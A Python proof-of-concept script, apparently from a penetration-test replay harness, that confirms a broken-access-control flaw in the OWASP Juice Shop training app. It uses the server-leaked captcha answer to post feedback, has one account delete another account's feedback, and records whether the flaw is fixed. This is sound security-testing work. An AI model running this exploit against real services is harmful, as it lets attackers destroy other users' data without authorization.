#!/usr/bin/env python3
"""pt09: any authenticated account can delete any other account's feedback.

Found while investigating Juice Shop's own "Five-Star Feedback" scoreboard
challenge, whose solve condition (count of 5-star feedback rows == 0) is
an odd thing to check unless the intended path is deleting the seeded
positive reviews without authorization, which is exactly what this
confirms: DELETE /api/Feedbacks/{id} checks that a caller is
authenticated, never that they own the row.

Note on the captcha required to submit feedback at all: the server
returns the correct answer in the same response that asks the
question (`GET /rest/captcha/` -> {"captchaId", "captcha", "answer"}).
That's a real, separate, already-catalogued bug (Juice Shop's own
"CAPTCHA Bypass" challenge), not this item's finding; this scenario
uses it only to get past the form, the same way a real attacker would.

Standard library only (urllib, base64, json).
"""

from __future__ import annotations

import argparse
import base64
import json
import sys
import time
import urllib.error
import urllib.request
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent.parent))
import ledger  # noqa: E402

DEFAULT_BLUEPRINT = Path(__file__).resolve().parent / "blueprints" / "pt09-001.json"


def _jwt_payload(token: str) -> dict:
    payload_b64 = token.split(".")[1]
    padded = payload_b64 + "=" * (-len(payload_b64) % 4)
    return json.loads(base64.urlsafe_b64decode(padded))


def _request(method: str, url: str, token: str | None = None, body: dict | None = None):
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(url, data=data, method=method)
    if body is not None:
        req.add_header("Content-Type", "application/json")
    if token:
        req.add_header("Authorization", f"Bearer {token}")
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            text = resp.read()
            return resp.status, (json.loads(text) if text else {})
    except urllib.error.HTTPError as exc:
        try:
            return exc.code, json.loads(exc.read())
        except Exception:
            return exc.code, {}


def _register_and_login(target: str, label: str, stamp: str) -> tuple[str, int]:
    email = f"pt09-{label}-{stamp}@flatline.test"
    password = "Pt09Pass123!"
    _request("POST", f"{target}/api/Users", body={"email": email, "password": password, "passwordRepeat": password})
    status, body = _request("POST", f"{target}/rest/user/login", body={"email": email, "password": password})
    if status != 200:
        raise RuntimeError(f"login of {email} failed: HTTP {status}")
    token = body["authentication"]["token"]
    return token, _jwt_payload(token)["data"]["id"]


def _submit_feedback(target: str, token: str, user_id: int, comment: str) -> int:
    cap_status, captcha = _request("GET", f"{target}/rest/captcha/")
    status, body = _request(
        "POST", f"{target}/api/Feedbacks", token=token,
        body={"comment": comment, "rating": 5, "UserId": user_id, "captchaId": captcha["captchaId"], "captcha": captcha["answer"]},
    )
    if status != 201:
        raise RuntimeError(f"feedback submission failed: HTTP {status}, {body}")
    return body["data"]["id"]


def run(target: str, blueprint: dict) -> dict:
    ledger.guard_target_host(target)
    stamp = str(int(time.time() * 1000))

    victim_token, victim_id = _register_and_login(target, "victim", stamp)
    attacker_token, _ = _register_and_login(target, "attacker", stamp)

    victim_feedback_id = _submit_feedback(target, victim_token, victim_id, "pt09 victim feedback")

    exploit_status, _ = _request("DELETE", f"{target}/api/Feedbacks/{victim_feedback_id}", token=attacker_token)
    check_status, _ = _request("GET", f"{target}/api/Feedbacks/{victim_feedback_id}", token=victim_token)
    actually_deleted = check_status == 404

    if exploit_status in (401, 403):
        status = "REMEDIATED"
        summary = f"Blocked with HTTP {exploit_status}."
    elif exploit_status == 200 and actually_deleted:
        status = "VULNERABLE"
        summary = f"Attacker deleted the victim's feedback (id={victim_feedback_id}, owned by UserId={victim_id}) with no ownership check."
    else:
        status = "ERROR"
        summary = f"Inconclusive: delete HTTP {exploit_status}, actually_deleted={actually_deleted}."

    # Legitimate check: a different feedback entry, the victim deleting their own.
    own_feedback_id = _submit_feedback(target, victim_token, victim_id, "pt09 victim's own feedback, to be self-deleted")
    legit_status, _ = _request("DELETE", f"{target}/api/Feedbacks/{own_feedback_id}", token=victim_token)
    legitimate_self_delete_ok = legit_status == 200

    return {
        "vulnerability_id": blueprint["vulnerability_id"],
        "mitre_technique": blueprint["mitre_technique"],
        "target": target,
        "status": status,
        "exploit_http_status": exploit_status,
        "summary": summary,
        "legitimate_self_delete_ok": legitimate_self_delete_ok,
        "legitimate_self_delete_http_status": legit_status,
    }


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--blueprint", default=str(DEFAULT_BLUEPRINT))
    parser.add_argument("--target", default=None, help="Overrides the blueprint's target.host, e.g. to point at the proxy instead.")
    args = parser.parse_args()

    blueprint = json.loads(Path(args.blueprint).read_text())
    target = args.target or blueprint["target"]["host"]

    result = run(target, blueprint)
    print(json.dumps(result, indent=2))

    results_dir = Path(__file__).resolve().parent / "results"
    results_dir.mkdir(exist_ok=True)
    out_path = results_dir / f"{result['vulnerability_id']}-{int(time.time())}.json"
    out_path.write_text(json.dumps(result, indent=2))

    ledger._append_log({"event": "replay_run", "item": "pt09-unauthorized-feedback-deletion", **result})

    if result["status"] == "ERROR":
        sys.exit(2)


if __name__ == "__main__":
    main()
